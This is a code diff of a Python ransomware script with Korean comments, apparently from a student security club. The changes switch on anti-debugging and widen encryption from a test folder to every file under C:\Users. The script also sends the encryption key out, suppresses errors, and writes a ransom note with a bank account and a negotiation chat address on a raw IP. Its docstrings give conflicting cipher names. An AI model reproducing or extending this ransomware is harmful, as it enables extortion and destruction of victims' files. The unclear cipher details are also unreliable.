@@ -7,7 +7,7 @@ import gc
 from cryptography.fernet import Fernet
     
 def main():
-    #anti_debug()
+    anti_debug()
     warning()
     
     #암호화키 생성 및 전송
@@ -16,7 +16,7 @@ def main():
     send_key(f"{your_id} : {encryption_key.decode()}")
     
     #암호화 진행
-    search_and_encrypt_files(key=encryption_key,path="C:\\test",extension=(".txt",".md"))
+    search_and_encrypt_files(key=encryption_key,path="C:\\Users",extension=("all",))
     
     #암호화키 세탁과 삭제
     for i in range(100):
@@ -37,7 +37,7 @@ def anti_debug():
     """
     if sys.gettrace() is not None:
         print("Debug Detected")
-        exit(-2)
+        sys.exit(0)
 
 def generate_encryption_key(length=32):
     """
@@ -53,7 +53,7 @@ def generate_encryption_key(length=32):
 def search_and_encrypt_files(key,path="C:\\test",extension=(".txt")):
     """
     @breif : 시스템 내 파일 탐색 및 암호화 실행
-    @param key : SHA256 방식으로 암호화할 키
+    @param key : AES128 방식으로 암호화할 키
     @param path : 암호화를 진행할 최상위폴더
     @param extension : 암호화를 진행할 확장자("all" : 전부)
     @return : None
@@ -78,7 +78,7 @@ def search_and_encrypt_files(key,path="C:\\test",extension=(".txt")):
     
     def encrypt_file(filename):
         """
-        @breif : AES256 방식으로 암호화하는 함수
+        @breif : AES128 방식으로 암호화하는 함수
         @param : 파일명
         @return : None
         """
@@ -91,7 +91,10 @@ def search_and_encrypt_files(key,path="C:\\test",extension=(".txt")):
 
     files=search_file(path,*extension)
     for file in files:
-        encrypt_file(file)
+        try:
+            encrypt_file(file)
+        except:
+            pass
     return
 
 def create_and_display_ransom_note(id):
@@ -111,15 +114,17 @@ def create_and_display_ransom_note(id):
     decode_tool="DecodeTool.py"
     
     with open(ransom_note,"w+",encoding="utf-8") as f:
-        message=f"""
+        message=f"""---2024-01-08 keeper 기술문서---
 당신의 컴퓨터는 해킹되었습니다.
 키퍼 14기 이영재에게 돈을 입금하세요.
 키퍼은행 2019-05112100-1557 예금주 이상혁
 
-2024-01-08 keeper 기술문서
+협상 채팅 : http://180.64.207.217:9999/chat
+아래의 id를 입력해 들어오세요.
+
 당신의 아이디 : {id}"""
         f.write(message)
-        f.seek(0,0) # fseek(fp,0,SEEK_SET);
+        f.seek(0,0)
         print(f.read())
         
     with open(decode_tool,"w") as f:
